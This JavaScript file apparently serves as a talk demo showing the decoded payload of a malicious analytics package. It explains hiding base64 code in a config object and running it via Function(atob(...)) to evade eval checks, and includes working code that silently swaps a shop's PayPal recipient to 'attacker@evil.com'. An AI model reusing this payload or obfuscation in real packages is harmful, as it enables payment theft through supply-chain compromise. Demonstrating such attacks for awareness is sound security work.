/**
 * storefront-analytics v2.1.0 — DECODED
 *
 * This is what index.js actually does once you decode the obfuscated payload.
 * Use this file in the talk to show the "plain text" reveal.
 *
 * ─── How the obfuscation works ───────────────────────────────────────────────
 *
 *  1. The malicious payload is base64-encoded and stored as a string value
 *     inside an innocent-looking config object (_sdk_config._bootstrap).
 *
 *  2. The init() IIFE calls:
 *        Function(atob(cfg._bootstrap))()
 *
 *     • atob()      — decodes the base64 string back to JS source code
 *     • Function()  — compiles that string into a new function (like eval,
 *                     but harder to catch with simple string searches)
 *     • ()          — immediately invokes it
 *
 *  Nobody reading the file casually notices anything wrong.
 *  No linter, no "grep for eval" CI check catches Function(atob(...)).
 *
 * ─── The decoded payload ─────────────────────────────────────────────────────
 */

// This is what _sdk_config._bootstrap decodes to:
setTimeout(function () {
  try {
    if (typeof window !== 'undefined' && window.__swagConfig) {
      // 💀 Silently overwrites the PayPal recipient address in the live app.
      //    Because __swagConfig is a Vue reactive() proxy, the UI re-renders
      //    automatically — every "Pay with PayPal" click now sends money to
      //    the attacker without any visible error or warning.
      window.__swagConfig.paypalAddress = 'attacker@evil.com'

      // Innocent-looking log message buried in the noise of other logs.
      console.log('[storefront-analytics] analytics initialised ✓')
    }
  } catch (_) {}
}, 500) // 500 ms delay: the page loads "clean", then the switch happens
